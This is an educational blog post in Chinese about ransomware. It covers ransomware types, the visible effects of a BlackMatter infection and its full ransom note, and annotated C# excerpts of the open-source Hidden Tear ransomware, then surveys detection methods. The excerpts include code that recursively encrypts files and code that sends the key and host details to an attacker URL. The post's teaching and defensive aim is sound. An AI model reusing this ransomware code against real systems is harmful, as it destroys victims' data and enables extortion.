# 【Day 22】病毒出得去，贖金進得來，勒索軟體發大財 - Ransomware

## 環境
* Windows 10 1709

## 勒索軟體種類
最早的勒索軟體可追溯至由 Joseph Popp 製作的 AIDS Trojan，透過加密磁碟上的檔案，要求使用者付贖金。這類的勒索軟體也是目前最常見的，也是這篇文章主要要介紹的，但其實還有別種勒索軟體。

### Encrypting Ransomware
目前最常見的勒索軟體類型，透過加密檔案威脅使用者支付贖金來復原檔案，其中 2017 年爆發的 WannaCry 就屬於這種。

### Non-Encrypting Ransomware
不加密檔案，而是誘騙使用者花錢。例如 2011 年有個勒索軟體利用 Windows 的產品啟用告示，誘騙使用者撥打價格高昂的長途電話費用。

### Leakware
這是一個 Encrypting Ransomware 的反向操作，不一定是要求使用者付贖金贖回他們的資料，而是威脅使用者如果不交贖金就公開資料。例如 2020 年 Conti 勒索軟體要求研華繳交贖金，否則公開內部機密資料。

### Mobile Ransomware
針對行動裝置，例如鎖住裝置螢幕，或是偷取使用者資料來威脅使用者付贖金。

## 被勒索軟體感染會怎樣
以下將以 2021 年出現的 [BlackMatter](https://bazaar.abuse.ch/sample/22d7d67c3af10b1a37f277ebabe2d1eb4fd25afbd6437d4377400e148bcc08d6/) 舉例，它屬於 Encrypting Ransomware + Leakware 類型，後面將以一般使用者的角度觀察發生勒索軟體後會變什麼樣子。要玩 Sample 請務必開虛擬機，否則檔案被加密沒人救得回來。

首先最明顯的是桌面背景被替換。有的還會播放聲音警告你這台機器的檔案已經被加密，不過也有些勒索軟體都沒有。
![](https://i.imgur.com/SUoFEGx.png)

檔案被加密後，將檔案內容加密並且添增副檔名，從下圖可以看到被加密成副檔名 1y1lbW1lL 的檔案。有些勒索軟體只會加密特定副檔名的檔案，例如 zip、pdf、jpg 等等，而不會加密 exe、dll 之類的，但是有的是全都加密。
![](https://i.imgur.com/DtVsh4t.png)

再來是各個資料夾隨處可見的 README。內容基本上就是要你下載 [tor](https://www.torproject.org/download/)，連結到網址支付贖金後就會給你解密工具，如果不給就威脅公布資料。
```
      ~+                                       
               *       +
         '     BLACK        |
     ()    .-.,='``'=.    - o -         
           '=/_       \     |           
        *   |  '=._    |                
             \     `=./`,        '    
          .   '=.__.=' `='      *
 +             Matter        +
      O      *        '       .

>>> What happens?
   Your network is encrypted, and currently not operational. We have downloaded 1TB from your fileserver.
   We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data.

>>> What guarantees? 
   We are not a politically motivated group and we do not need anything other than your money. 
   If you pay, we will provide you the programs for decryption and we will delete your data. 
   If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. 
   We always keep our promises.

>> Data leak includes
1. Full emloyeers personal data
2. Network information
3. Schemes of buildings, active project information, architect details and contracts, 
4. Finance info


>>> How to contact with us? 
   1. Download and install TOR Browser (https://www.torproject.org/).
   2. Open http://supp24yy6a66hwszu2piygicgwzdtbwftb76htfj7vnip3getgqnzxid.onion/7NT6LXKC1XQHW5039BLOV.
  
>>> Warning! Recovery recommendations.  
   We strongly recommend you to do not MODIFY or REPAIR your files, that will damage them.
```

## Hidden Tear
[Hidden Tear](https://github.com/goliate/hidden-tear) 是一個開源的勒索軟體，2015 年後這個專案就沒更新了。它的變種也非常多，例如 MoWare。甚至有出現一些很鬧的變種，例如 CryptoSpider 只發送病毒通知和貓貓圖，卻沒有要贖金；還有變種 RensenWare 要求使用者要玩射擊遊戲才能解密。

### 功能
根據專案的介紹，除了解密工具外，它做了勒索軟體最基本的幾個功能。
* 用 AES 加密法加密檔案
* 把加密的 Key 送到攻擊者的機器
* 存放繳交贖金訊息的文字檔

### 實作方式
這個專案使用 C# 語言撰寫，以下實作方式就把上述三個功能的程式片段列出，並附上註解。

#### 用 AES 加密法加密檔案
```csharp=
public void encryptDirectory(string location, string password) {
    // 選擇加密目標的副檔名
    var validExtensions = new[] {
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
    };
    
    // 列舉當前目錄內的所有檔案加密
    string[] files = Directory.GetFiles(location);
    string[] childDirectories = Directory.GetDirectories(location);
    for (int i = 0; i < files.Length; i++){
        string extension = Path.GetExtension(files[i]);
        if (validExtensions.Contains(extension))
        {
            EncryptFile(files[i],password);
        }
    }
    
    // 繼續往下層目錄搜索檔案
    for (int i = 0; i < childDirectories.Length; i++){
        encryptDirectory(childDirectories[i],password);
    }
}

public void EncryptFile(string file, string password) {
    byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
    byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
    
    // 用 password 的 SHA256 Hash 當作 AES 的 Key 加密檔案
    passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
    byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
    
    // 加密後覆蓋檔案並添增副檔名 .locked
    File.WriteAllBytes(file, bytesEncrypted);
    System.IO.File.Move(file, file+".locked");
}
```


#### 把加密的 Key 送到指定的機器
```csharp=
// 用亂數取 length 個字元當作 password
public string CreatePassword(int length) {
    const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
    StringBuilder res = new StringBuilder();
    Random rnd = new Random();
    while (0 < length--){
        res.Append(valid[rnd.Next(valid.Length)]);
    }
    return res.ToString();
}

// 這邊傳送的是 password，而不是 AES 的 key
public void SendPassword(string password) {        
    string info = computerName + "-" + userName + " " + password;
    var fullUrl = targetURL + info;
    var conent = new System.Net.WebClient().DownloadString(fullUrl);
}
```

#### 存放繳交贖金訊息的文字檔
```csharp=
// 在桌面建立 READ_IT.txt 檔案存放勒索訊息
public void messageCreator() {
    string path = "\\Desktop\\test\\READ_IT.txt";
    string fullpath = userDir + userName + path;
    string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
    System.IO.File.WriteAllLines(fullpath, lines);
}
```

## 偵測
### Honey Pot
放個模擬真實環境的機器，讓惡意程式以為這是它的目標。用這個方式蒐集惡意程式的檔案資訊或行為 Pattern 等。

### Yara
透過檔案的 Signature 確認這個檔案是不是已存在的勒索軟體，不過這種方法是建立在有龐大的資料庫的前提下。

### 行為 Pattern
根據程式執行中所做的行為判斷是不是惡意程式，例如大量改寫檔案，甚至有試圖改寫目前正在執行的執行檔。不過這個需要足夠的證據去證明目前執行的是一個惡意程式，因為可能有些合法的軟體也會有大量寫檔案的情形。

### Machine Learning
同樣是透過行為 Pattern，不過是用 ML 的方式去判斷是否是惡意程式。

## 參考資料
* [Wiki: 勒索軟體](https://zh.wikipedia.org/wiki/%E5%8B%92%E7%B4%A2%E8%BB%9F%E9%AB%94)
* [Wiki: WannaCry](https://zh.wikipedia.org/wiki/WannaCry)
* [當勒索軟體與資料外洩合流](https://www.ithome.com.tw/voice/141464)
* [勒索軟體種類](https://blog.netwrix.com/2017/06/01/nine-scariest-ransomware-viruses/)
* [Hidden Tear 變種](https://www.ithome.com.tw/news/115434)
* [ML: Ransomware](https://www.acronis.com/en-us/articles/machine-learning-prevent-ransomware/)
* [leonv024/RAASNet](https://github.com/leonv024/RAASNet)
